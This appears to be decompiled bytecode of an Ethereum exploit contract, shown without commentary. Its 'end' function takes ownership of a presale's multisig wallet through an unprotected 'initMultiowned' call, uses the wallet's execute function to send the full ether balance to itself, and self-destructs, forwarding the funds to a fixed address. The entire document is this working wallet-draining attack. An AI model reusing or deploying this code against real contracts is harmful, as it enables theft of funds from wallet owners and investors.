contract main {


// =======================  Init code  ======================


const _fallback = code.data[28 len 1054]




// =====================  Runtime code  =====================


function end(address arg1) {
    require ext_code.size(arg1)
    call arg1.presaleEndBlock() with:
         gas gas_remaining - 710 wei
    require ext_call.success
    require block.number >= ext_call.return_data[0]
    require ext_code.size(arg1)
    call arg1.0xd1759141 with:
         gas gas_remaining - 710 wei
    require ext_call.success
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).initMultiowned(address[] rg1, uint256 rg2) with:
         gas gas_remaining - 710 wei
        args Array(len=1, data=this.address), 1
    require ext_call.success
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).0xb61d27f6 with:
         gas gas_remaining - 710 wei
        args address(arg1), 0, 96, 4, 0, 0xee889ed000000000000000000000000000000000000000000000000000000000
    require ext_call.success
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).0xb61d27f6 with:
         gas gas_remaining - 710 wei
        args address(this.address), eth.balance(ext_call.return_data[0]), 96, 4, 0, 0xa3e76c0f00000000000000000000000000000000000000000000000000000000
    require ext_call.success
    require not eth.balance(arg1)
    require not eth.balance(ext_call.return_data[0])
    selfdestruct(0x96050f871811344dd44c2f5b7bc9741dff296f5e)
}

function receive() payable {
  stop
}

function _fallback() payable {
    revert
}



}
